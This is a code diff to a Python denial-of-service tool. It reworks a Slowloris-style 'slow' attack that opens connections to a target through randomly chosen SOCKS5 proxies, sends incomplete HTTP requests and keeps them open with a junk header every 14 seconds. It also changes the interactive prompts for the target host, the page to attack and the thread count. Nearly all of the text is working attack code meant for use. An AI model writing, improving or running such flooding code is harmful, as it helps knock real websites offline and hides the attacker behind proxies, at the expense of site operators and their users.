@@ -249,28 +249,25 @@ def sslflood():
 					s.close()
 
 def slow():
+	time.sleep(1)
 	proxy = random.choice(proxies).strip().split(":")
-	accept = random.choice(acceptall)
-	while True:
-		try:
-			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			s = socks.socksocket()
-			s.connect((str(ip), int(port)))
-			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
-			s.send(("Connection:keep-alive").encode("utf-8"))
-			print("[*] Slow attack from --> "+str(proxy[0])+":"+str(proxy[1]))
-			print("[!] Wait 14 seconds to resend request")
+	try:
+		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+		s = socks.socksocket()
+		s.connect((str(ip), int(port)))
+		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
+		s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+		s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+		s.send(("Connection:keep-alive").encode("utf-8"))
+		print("[*] Slow attack from --> "+str(proxy[0])+":"+str(proxy[1]))
+		while True:
 			time.sleep(14)
-			try:
-				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-				print("[*] Resent from --> "+str(proxy[0])+":"+str(proxy[1]))
-			except:
-				s.send(accept)
-				print("[!] Request resent")
-		except:
-			s.close()
-			print("[!] Waiting")
+			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+			print("[*] Resent from --> "+str(proxy[0])+":"+str(proxy[1]))
+	except:
+		s.close()
+		print("[!] Socks Down")
+		slow()
 
 def main():
 	global ip
@@ -280,8 +277,14 @@ def main():
 	global multiple
 	mode = str(input("> Choose Your Mode (cc/slow) :"))
 	ip = str(input("> Host/Ip:"))
-	https = str(input("> Https(y/n):"))
-	url = str(input("> Page you want to attack(default=/):"))
+	if mode == "slow":
+		pass
+	else:
+		https = str(input("> Https(y/n):"))
+	if mode == "slow":
+		pass
+	else:
+		url = str(input("> Page you want to attack(default=/):"))
 	port = str(input("> Port(Https default is 443):"))
 	if port == '':
 		port = int(80)
@@ -309,14 +312,18 @@ def main():
 		pass
 	else:
 		multiple = int(input("> Input the Magnification:"))
-	if url == '':
-		url2 = "/"
+	if mode == "slow":
+		pass
 	else:
-		url2 = str(url)
+		if url == '':
+			url2 = "/"
+		else:
+			url2 = str(url)
 	if mode == "slow":
 		for i in range(thread_num):
 			th = threading.Thread(target = slow)
 			th.start()
+			time.sleep(0.1)
 	elif mode == "cc":
 		if https == "y":
 			for i in range(thread_num):
